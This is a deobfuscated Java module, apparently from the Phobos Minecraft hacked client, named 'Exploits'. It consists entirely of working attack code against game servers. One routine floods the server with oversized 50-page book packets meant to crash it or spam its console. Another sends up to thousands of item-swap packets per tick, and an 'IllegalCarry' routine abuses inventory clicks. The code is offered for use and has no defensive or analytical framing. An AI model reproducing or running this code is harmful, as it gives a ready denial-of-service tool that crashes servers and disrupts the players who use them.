//Deobfuscated with https://github.com/PetoPetko/Minecraft-Deobfuscator3000 using mappings "1.12 stable mappings"!

package me.earth.phobos.features.modules.misc;

import java.util.Random;
import me.earth.phobos.event.events.PacketEvent;
import me.earth.phobos.features.modules.Module;
import me.earth.phobos.features.setting.Bind;
import me.earth.phobos.features.setting.Setting;
import net.minecraft.client.gui.inventory.GuiContainer;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.Items;
import net.minecraft.init.SoundEvents;
import net.minecraft.inventory.ClickType;
import net.minecraft.inventory.Slot;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.server.SPacketSoundEffect;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent;
import org.lwjgl.input.Keyboard;

public class Exploits extends Module {
  public Setting<Boolean> illegalCarry = register(new Setting("IllegalCarry", Boolean.valueOf(false)));
  
  public Setting<Bind> toXCarry = register(new Setting("ToXCarry", new Bind(-1), v -> ((Boolean)this.illegalCarry.getValue()).booleanValue()));
  
  public Setting<Bind> fromXCarry = register(new Setting("FromXCarry", new Bind(-1), v -> ((Boolean)this.illegalCarry.getValue()).booleanValue()));
  
  public Setting<Boolean> bookCrash = register(new Setting("BookCrash", Boolean.valueOf(false)));
  
  public Setting<Mode> mode = register(new Setting("Mode", Mode.WindowClick, v -> ((Boolean)this.bookCrash.getValue()).booleanValue()));
  
  public Setting<Integer> delay = register(new Setting("Delay", Integer.valueOf(5), Integer.valueOf(1), Integer.valueOf(500), v -> ((Boolean)this.bookCrash.getValue()).booleanValue()));
  
  public Setting<Integer> strLength = register(new Setting("Length", Integer.valueOf(600), Integer.valueOf(100), Integer.valueOf(655), v -> ((Boolean)this.bookCrash.getValue()).booleanValue()));
  
  public Setting<Boolean> offhandCrash = register(new Setting("OffhandCrash", Boolean.valueOf(false)));
  
  private final Setting<Boolean> antilag = register(new Setting("AntiOffhandCrash", Boolean.valueOf(true), v -> ((Boolean)this.offhandCrash.getValue()).booleanValue()));
  
  private final Setting<Boolean> docrash = register(new Setting("Use Offhand Crash", Boolean.valueOf(true), v -> ((Boolean)this.offhandCrash.getValue()).booleanValue()));
  
  private final Setting<Integer> loopzz = register(new Setting("Times to loop", Integer.valueOf(500), Integer.valueOf(100), Integer.valueOf(5000), v -> ((Boolean)this.offhandCrash.getValue()).booleanValue()));
  
  private Packet packet;
  
  private String pages = "";
  
  private boolean flag = true;
  
  public Exploits() {
    super("Exploits", "Some expploits", Module.Category.MISC, true, false, false);
  }
  
  public void onEnable() {
    if (((Boolean)this.bookCrash.getValue()).booleanValue()) {
      this.pages = genRandomString((Integer)this.strLength.getValue());
      runThread();
      this.flag = true;
    } 
  }
  
  public void onDisable() {
    if (((Boolean)this.bookCrash.getValue()).booleanValue()) {
      this.pages = "";
      this.flag = false;
    } 
  }
  
  public void onUpdate() {
    if (((Boolean)this.offhandCrash.getValue()).booleanValue()) {
      if (((Boolean)this.docrash.getValue()).booleanValue())
        for (int i = 0; i < ((Integer)this.loopzz.getValue()).intValue(); i++) {
          BlockPos playerBlock = new BlockPos(mc.player.posX, mc.player.posY - 1.0D, mc.player.posZ);
          mc.player.connection.sendPacket((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, playerBlock, EnumFacing.UP));
        }  
      if (mc.currentScreen instanceof net.minecraft.client.gui.GuiMainMenu || mc.currentScreen instanceof net.minecraft.client.gui.GuiDisconnected || mc.currentScreen instanceof net.minecraft.client.gui.GuiDownloadTerrain || mc.currentScreen instanceof net.minecraft.client.multiplayer.GuiConnecting || mc.currentScreen instanceof net.minecraft.client.gui.GuiMultiplayer)
        if (isEnabled())
          toggle();  
    } 
  }
  
  @SubscribeEvent
  public void onPacketSend(PacketEvent.Send event) {
    if (((Boolean)this.offhandCrash.getValue()).booleanValue() && ((Boolean)this.antilag.getValue()).booleanValue())
      if (event.getPacket() instanceof SPacketSoundEffect) {
        SPacketSoundEffect packet = (SPacketSoundEffect)event.getPacket();
        if (packet.getSound() == SoundEvents.ITEM_ARMOR_EQUIP_GENERIC)
          event.setCanceled(true); 
      }  
  }
  
  public void onLogout() {
    disable();
  }
  
  public void onUnload() {
    disable();
  }
  
  private void runThread() {
    (new Thread(() -> {
          try {
            ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
            NBTTagList list = new NBTTagList();
            NBTTagCompound tag = new NBTTagCompound();
            String author = mc.getSession().getUsername();
            for (int i = 0; i < 50; i++) {
              NBTTagString tString = new NBTTagString(this.pages);
              list.appendTag((NBTBase)tString);
            } 
            tag.setString("author", author);
            tag.setString("title", "\n ZimCRASH \n");
            tag.setTag("pages", (NBTBase)list);
            bookObj.setTagInfo("pages", (NBTBase)list);
            bookObj.setTagCompound(tag);
            if (this.mode.getValue() == Mode.ConsoleSpammer) {
              this.pages = genRandomString(Integer.valueOf(8192));
              this.strLength.setValue(Integer.valueOf(8192));
              this.delay.setValue(Integer.valueOf(225));
            } 
            while (this.flag) {
              switch ((Mode)this.mode.getValue()) {
                case CreativeInventory:
                  this.packet = (Packet)new CPacketCreativeInventoryAction(0, bookObj);
                case WindowClick:
                  this.packet = (Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0);
                case ConsoleSpammer:
                  this.packet = (Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0);
                  break;
              } 
              mc.player.connection.sendPacket(this.packet);
              try {
                Thread.sleep(((Integer)this.delay.getValue()).intValue());
              } catch (Exception e) {
                Thread.interrupted();
              } 
            } 
          } catch (Exception e) {
            e.printStackTrace();
          } 
        })).start();
  }
  
  private String genRandomString(Integer Length) {
    String SALTCHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    StringBuilder salt = new StringBuilder();
    Random rnd = new Random();
    while (salt.length() < Length.intValue()) {
      int index = (int)(rnd.nextFloat() * SALTCHARS.length());
      salt.append(SALTCHARS.charAt(index));
    } 
    String saltStr = salt.toString();
    return saltStr;
  }
  
  @SubscribeEvent(priority = EventPriority.NORMAL, receiveCanceled = true)
  public void onKeyInput(InputEvent.KeyInputEvent event) {
    if (((Boolean)this.illegalCarry.getValue()).booleanValue() && Keyboard.getEventKeyState() && mc.currentScreen instanceof GuiContainer)
      if (((Bind)this.toXCarry.getValue()).getKey() == Keyboard.getEventKey()) {
        GuiContainer container = (GuiContainer)mc.currentScreen;
        Slot slot = container.getSlotUnderMouse();
        if (slot != null) {
          mc.playerController.windowClick(container.inventorySlots.windowId, slot.getSlotIndex(), 0, ClickType.PICKUP, (EntityPlayer)mc.player);
          mc.playerController.windowClick(container.inventorySlots.windowId, -999, 0, ClickType.QUICK_CRAFT, (EntityPlayer)mc.player);
          mc.playerController.windowClick(0, 1, 1, ClickType.QUICK_CRAFT, (EntityPlayer)mc.player);
          mc.playerController.windowClick(container.inventorySlots.windowId, -999, 2, ClickType.QUICK_CRAFT, (EntityPlayer)mc.player);
        } 
      } else if (((Bind)this.fromXCarry.getValue()).getKey() == Keyboard.getEventKey()) {
        GuiContainer container = (GuiContainer)mc.currentScreen;
        Slot slot = container.getSlotUnderMouse();
        if (slot != null) {
          mc.playerController.windowClick(0, 1, 0, ClickType.PICKUP, (EntityPlayer)mc.player);
          mc.playerController.windowClick(0, -999, 0, ClickType.QUICK_CRAFT, (EntityPlayer)mc.player);
          mc.playerController.windowClick(container.inventorySlots.windowId, slot.getSlotIndex(), 1, ClickType.QUICK_CRAFT, (EntityPlayer)mc.player);
          mc.playerController.windowClick(0, -999, 2, ClickType.QUICK_CRAFT, (EntityPlayer)mc.player);
        } 
      }  
  }
  
  private enum Mode {
    CreativeInventory, WindowClick, ConsoleSpammer;
  }
}
